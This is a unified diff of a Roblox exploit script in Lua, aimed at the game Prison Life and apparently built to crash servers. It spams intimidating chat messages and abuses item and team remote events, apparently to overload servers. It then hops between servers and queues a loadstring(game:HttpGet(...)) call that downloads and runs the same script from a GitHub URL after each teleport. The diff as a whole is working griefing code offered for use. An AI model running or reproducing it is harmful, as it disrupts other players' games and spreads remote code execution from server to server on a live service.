@@ -1,62 +1,55 @@
-task.wait(1)
-
-local Camera = game:GetService("Workspace").CurrentCamera
-local Rstorage = game:GetService("ReplicatedStorage")
-local Rservice = game:GetService("RunService")
-local Hbeat = Rservice.Heartbeat
-local Rstep = Rservice.RenderStepped
-local Stepped = Rservice.Stepped
-local Players = game:GetService("Players")
-local Teams = game:GetService("Teams")
-local LocalPlayer = Players.LocalPlayer
-
-if not LocalPlayer then
-	repeat
-		task.wait(0.1)
-		LocalPlayer = Players.LocalPlayer
-	until LocalPlayer
-end
-
-local PlayerScripts = LocalPlayer:WaitForChild("PlayerScripts")
-local RegModule = nil
-local SavedPositions = {};
-local HttpRequest = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
-
-local ChatMessages = {
-	"THIS SERVER HAS BEEN COMPROMISED BY THE 7TH BATTALION",
-	"WE OWN PRISON LIFE AND ALL OF ITS PLAYERS", 
-	"YOU ARE EXPENDABLE"
-}
-
-for Index, Message in ipairs(ChatMessages) do
-	Rstorage:WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest"):FireServer(Message, "All")
-	task.wait()
-end
-
-task.wait(1.25)
-
--- Auto Attach on Server hop
-queueteleport = (syn and syn.queue_on_teleport) or queue_on_teleport or (fluxus and fluxus.queue_on_teleport)
-
-LocalPlayer.OnTeleport:Connect(function(State)
-	queueteleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/ajbeaver25/PrisonLifeCrash-ServerHop/refs/heads/main/source.lua'))()")
-end)
-
 pcall(function()
+	task.wait(1)
+	
+	local Camera = game:GetService("Workspace").CurrentCamera
+	local Rstorage = game:GetService("ReplicatedStorage")
+	local Rservice = game:GetService("RunService")
+	local Hbeat = Rservice.Heartbeat
+	local Rstep = Rservice.RenderStepped
+	local Stepped = Rservice.Stepped
+	local Players = game:GetService("Players")
+	local Teams = game:GetService("Teams")
+	local LocalPlayer = Players.LocalPlayer
+	
+	if not LocalPlayer then
+		repeat
+			task.wait(0.1)
+			LocalPlayer = Players.LocalPlayer
+		until LocalPlayer
+	end
+	
+	local PlayerScripts = LocalPlayer:WaitForChild("PlayerScripts")
+	local RegModule = nil
+	local SavedPositions = {};
+	local HttpRequest = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
+	
+	local ChatMessages = {
+		"THIS SERVER HAS BEEN COMPROMISED BY THE 7TH BATTALION",
+		"WE OWN PRISON LIFE AND ALL OF ITS PLAYERS", 
+		"YOU ARE EXPENDABLE"
+	}
+	
+	for Index, Message in ipairs(ChatMessages) do
+		Rstorage:WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest"):FireServer(Message, "All")
+		task.wait()
+	end
+	
+	task.wait(1.25)
+	
 	game:GetService("StarterGui"):SetCore("DevConsoleVisible", true)
-
+	
 	-- AntiCrash
 	PlayerScripts:WaitForChild("ClientGunReplicator").Enabled = false
-
+	
 	local SaveCamPos = function()
 		SavedPositions.OldCameraPos = Camera.CFrame
 	end
-
+	
 	local LoadCamPos = function()
 		Rstep:Wait()
 		Camera.CFrame = SavedPositions.OldCameraPos or Camera.CFrame
 	end
-
+	
 	local waitfor = function(source, args, interval)
 		local int = interval or 5
 		local timeout = tick() + int
@@ -68,11 +61,11 @@ pcall(function()
 			return nil
 		end
 	end
-
+	
 	local TeamEve = function(args)
 		workspace.Remote.TeamEvent:FireServer(args)
 	end
-
+	
 	local TeamTo = function(args)
 		local tempos = LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame; SavedPositions.AutoRe = tempos; SaveCamPos()
 		if args == "criminal" then
@@ -98,11 +91,11 @@ pcall(function()
 		end
 		LocalPlayer.CharacterAdded:Wait(); waitfor(LocalPlayer.Character, "HumanoidRootPart", 5).CFrame = tempos; LoadCamPos()
 	end
-
+	
 	local LocTP = function(cframe)
 		LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame = cframe
 	end
-
+	
 	local LAction = function(args, args2)
 		if args == "sit" then
 			LocalPlayer.Character:FindFirstChild("Humanoid").Sit = true
@@ -129,7 +122,7 @@ pcall(function()
 			LocalPlayer.Character:FindFirstChild("Humanoid"):UnequipTools()
 		end
 	end
-
+	
 	local RTPing = function(value)
 		if value then
 			task.wait(value)
@@ -142,7 +135,7 @@ pcall(function()
 		local RoundTrip = (RT2-RT1) * 1000
 		return RoundTrip
 	end
-
+	
 	local ItemGrab = function(source, args)
 		local lroot = LocalPlayer.Character:FindFirstChild("HumanoidRootPart"); local timeout = tick() + 5
 		if lroot then SavedPositions.GetGunOldPos = not SavedPositions.GetGunOldPos and lroot.CFrame or SavedPositions.GetGunOldPos; end
@@ -156,7 +149,7 @@ pcall(function()
 		until LocalPlayer.Backpack:FindFirstChild(args) or LocalPlayer.Character:FindFirstChild(args) or tick() - timeout >=0
 		pcall(function() LocTP(SavedPositions.GetGunOldPos); end); SavedPositions.GetGunOldPos = nil
 	end
-
+	
 	local ItemHand = function(source, args)
 		if source and source == "old" then
 			game:GetService("Workspace").Remote.ItemHandler:InvokeServer(args)
@@ -179,14 +172,14 @@ pcall(function()
 			workspace.Remote.ItemHandler:InvokeServer({Position = LocalPlayer.Character.Head.Position, Parent = workspace.Prison_ITEMS.giver:FindFirstChild(args) or workspace.Prison_ITEMS.single:FindFirstChild(args)})
 		end
 	end
-
+	
 	local Gun = function(args) 
 		if false then
 			ItemHand(workspace["Prison_ITEMS"].giver, args)
 			return
 		end; workspace.Remote.ItemHandler:InvokeServer({Position = LocalPlayer.Character.Head.Position, Parent = workspace.Prison_ITEMS.giver:FindFirstChild(args) or workspace.Prison_ITEMS.single:FindFirstChild(args)})
 	end
-
+	
 	task.spawn(function()
 		local america = {}
 		for i,v in pairs(Players:GetPlayers()) do
@@ -199,9 +192,9 @@ pcall(function()
 				}
 			end
 		end
-
+	
 		print(`{#america} Players in server`)
-
+	
 		while task.wait(.1) do
 			pcall(function()
 				local new = LocalPlayer.Backpack:FindFirstChild("Remington 870") or LocalPlayer.Character:FindFirstChild("Remington 870")
@@ -216,17 +209,20 @@ pcall(function()
 			end)
 		end
 	end)
-
+	
 	print("waiting")	
-		if #game.Players:GetPlayers() >= 10 then
-			game:GetService("GuiService").ErrorMessageChanged:Connect(function()
-		    -- Code to run when you are disconnected
+	if #game.Players:GetPlayers() >= 10 then
+		game:GetService("GuiService").ErrorMessageChanged:Connect(function()
+	 		-- Code to run when you are disconnected
 			warn("KICKED FROM GAME")
 		end)
-			
+		
 		task.wait(80)
 	end
 end)
+
+-- Auto Attach on Server hop
+queueteleport = (syn and syn.queue_on_teleport) or queue_on_teleport or (fluxus and fluxus.queue_on_teleport)
 
 warn("SERVER HOPPING")
 while true do
@@ -242,6 +238,7 @@ while true do
 			end
 		end;if next(found) then
 			game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, found[math.random(1, #found)], LocalPlayer)
+			queueteleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/ajbeaver25/PrisonLifeCrash-ServerHop/refs/heads/main/source.lua'))()")
 		end
 	end);
 
